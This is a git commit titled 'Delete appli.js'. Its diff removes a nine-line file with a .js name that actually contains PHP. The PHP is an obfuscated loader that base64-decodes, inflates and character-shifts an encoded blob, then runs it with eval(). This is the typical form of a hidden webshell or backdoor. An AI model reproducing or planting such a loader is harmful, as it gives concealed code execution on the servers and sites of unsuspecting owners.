a28029741c134f6a302096acef623e563340073e
bismillah2219 <customer.kredivosuport12@gmail.com>
2025-02-24 06:47:24 +0700

    Delete appli.js

--- appli.js
+++
@@ -1,9 +0,0 @@
-<?php function qCgyBr($mnoz)
-{ 
-$mnoz=gzinflate(base64_decode($mnoz));
- for($i=0;$i<strlen($mnoz);$i++)
- {
-$mnoz[$i] = chr(ord($mnoz[$i])-1);
- }
- return $mnoz;
- }eval(qCgyBr("rVJtbptAED3AnmKFUGJLFm5dfzS2nIi4RHH9KcBK0qpCG9jaKHhBu0sdJ62UQ/QEPVou0tm1cenHn6pFiB3NezNvmLcYw4OQoELEKQuEJFxWqj0UszDJI4oNqy5pQpecrK1slRk9hJB5R7e49PSxGcxnnv/+GIDjDz1kBp7jecPZdJ9RDAig1swF5Yysabn2QC5A3SMjQmxSHv2RWYCKicw1TE+WFCgGev769I8vcq4vbvBnfD6w4TsaD0c6PB9606HXRej56RteeI47tScO7sKGDj9lGRqc2553NXPf7MBi1D3IqchShu35fDzcEWAz1v+YW3nzMWehBCOxoCya7NZSMQsHgziq4WJbEMVRcJvKKn5EasFmzhO1wpWUmejW6ySLrYP3KV/WgWtgqyiDyKiXZM4ywgUN1mlE+2vC76J0w47CFZGg2td1pTF6ZUV9QLcjSe+lpkKCshA6VYppq/uKcAUFIeBBzGJ9U3U6zaTNOdkCSNRZQcW1GSzc8WzuB3Dg/qnWqv0Guo6/cKe+a0+9C8dVPMlzqml7BS0pqAShYKcAo9R+CBeDgL15IosZ6T0NFbHcJExSQffJL8jkcaSW3nnZedV43Wm2GmCjuSFMJdsn7Waj+aJ10ura9uVDeHNNkjb75L3dLDJ/dHs12frvJo1lY5Cu7MFG+f+T7fwXu6EraP7NzYCOZ6ffAQ=="));?>
